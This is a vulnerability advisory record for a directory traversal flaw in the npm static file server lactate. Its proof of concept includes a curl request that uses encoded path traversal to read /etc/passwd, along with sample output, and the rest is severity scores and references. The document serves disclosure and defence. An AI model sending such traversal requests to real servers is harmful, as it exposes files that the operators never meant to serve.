advisory_id: GHSA-68gr-cmcp-g3mj
datasource_id: github_osv_importer_v2/GHSA-68gr-cmcp-g3mj
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2019/06/GHSA-68gr-cmcp-g3mj/GHSA-68gr-cmcp-g3mj.json
aliases: []
summary: |
  Directory Traversal in lactate
  A crafted `GET` request can be leveraged to traverse the directory structure of a host using the lactate web server package, and request arbitrary files outside of the specified web root. This allows for a remote attacker to gain access to arbitrary files on the filesystem that the process has access to read.

  Mitigating factors:
  Only files that the user running `lactate` has permission to read will be accessible via this vulnerability.


  [Proof of concept](https://hackerone.com/reports/296645):
  Please globally install the `lactate` package and `cd` to a directory you wish to serve assets from. Next, run `lactate -p 8081` to start serving files from this location.

  The following cURL request can be used to demonstrate this vulnerability by requesting the target `/etc/passwd` file:

  ```
  curl "http://127.0.0.1:8081/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  ```
  ```
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  [...]
  ```


  ## Recommendation

  As there is currently no fix for this issue selecting an alternative static web server would be the best choice.
impacted_packages:
  - purl: pkg:npm/lactate
    affected_versions: vers:npm/<=0.13.12
    fixed_versions:
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2019/06/GHSA-68gr-cmcp-g3mj/GHSA-68gr-cmcp-g3mj.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-22
references:
  - url: https://github.com/RetireJS/retire.js/commit/800c8140884eaa5753a49308f560c925fe97b9a5
    reference_type:
    reference_id:
  - url: https://hackerone.com/reports/296645
    reference_type:
    reference_id:
  - url: https://snyk.io/vuln/npm:lactate:20180123
    reference_type:
    reference_id:
  - url: https://www.npmjs.com/advisories/560
    reference_type:
    reference_id:
